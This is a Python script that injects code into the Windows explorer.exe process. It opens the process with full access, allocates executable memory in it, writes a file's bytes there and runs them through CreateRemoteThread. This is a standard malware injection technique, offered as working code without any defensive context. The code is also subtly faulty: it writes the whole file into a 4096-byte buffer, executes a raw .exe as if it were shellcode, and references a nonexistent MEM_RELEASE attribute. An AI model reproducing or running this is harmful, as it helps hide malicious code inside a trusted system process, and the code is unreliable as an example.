import ctypes
import sys
import psutil

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

def main():
    # Find the process ID of "explorer.exe"
    process_id = None
    process_name = "explorer.exe"
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            process_id = proc.info['pid']
            break

    if process_id is None:
        print(f"Process '{process_name}' not found.")
        sys.exit(1)

    # Open the process
    process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
    if process_handle == 0:
        print("Failed to open the process.")
        sys.exit(1)

    # Allocate memory in the process
    remote_address = ctypes.windll.kernel32.VirtualAllocEx(process_handle, 0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    if remote_address == 0:
        print("Failed to allocate memory in the process.")
        ctypes.windll.kernel32.CloseHandle(process_handle)
        sys.exit(1)

    # Write data to the allocated memory
    with open("path/to/your/exe/file.exe", "rb") as file:
        data = file.read()
    data_size = len(data)
    bytes_written = ctypes.c_ulong(0)
    ctypes.windll.kernel32.WriteProcessMemory(process_handle, remote_address, data, data_size, ctypes.byref(bytes_written))
    if bytes_written.value != data_size:
        print("Failed to write data to the process memory.")
        ctypes.windll.kernel32.VirtualFreeEx(process_handle, remote_address, 0, ctypes.windll.kernel32.MEM_RELEASE)
        ctypes.windll.kernel32.CloseHandle(process_handle)
        sys.exit(1)

    # Execute the injected code
    thread_handle = ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, remote_address, None, 0, None)
    if thread_handle == 0:
        print("Failed to create a remote thread.")
        ctypes.windll.kernel32.VirtualFreeEx(process_handle, remote_address, 0, ctypes.windll.kernel32.MEM_RELEASE)
        ctypes.windll.kernel32.CloseHandle(process_handle)
        sys.exit(1)

    print("Code injected successfully.")

    # Cleanup
    ctypes.windll.kernel32.WaitForSingleObject(thread_handle, -1)
    ctypes.windll.kernel32.VirtualFreeEx(process_handle, remote_address, 0, ctypes.windll.kernel32.MEM_RELEASE)
    ctypes.windll.kernel32.CloseHandle(thread_handle)
    ctypes.windll.kernel32.CloseHandle(process_handle)

if __name__ == "__main__":
    main()